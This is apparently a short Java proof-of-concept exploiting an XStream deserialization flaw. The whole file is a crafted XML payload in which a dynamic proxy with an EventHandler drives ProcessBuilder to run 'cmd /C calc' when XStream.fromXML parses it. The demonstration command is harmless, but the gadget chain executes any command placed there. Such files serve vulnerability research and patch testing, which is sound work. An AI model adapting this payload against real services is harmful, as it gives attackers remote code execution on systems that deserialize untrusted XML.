package CVE_2013_7258;

import com.thoughtworks.xstream.XStream;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/10
 */
public class CVE_2013_7258 {
    public static void main(String[] args) {
        XStream xStream = new XStream();
        String xml = """
                      <?xml version="1.0" encoding="UTF-8"?>
                      <sorted-set>
                          <dynamic-proxy>
                              <interface>java.lang.Comparable</interface>
                              <handler class="java.beans.EventHandler">
                                  <target class="java.lang.ProcessBuilder">
                                      <command>
                                          <string>cmd</string>
                                          <string>/C</string>
                                          <string>calc</string>
                                      </command>
                                  </target>
                                  <action>start</action>
                              </handler>
                          </dynamic-proxy>
                      </sorted-set>
                      """;
        xStream.fromXML(xml);
    }


}
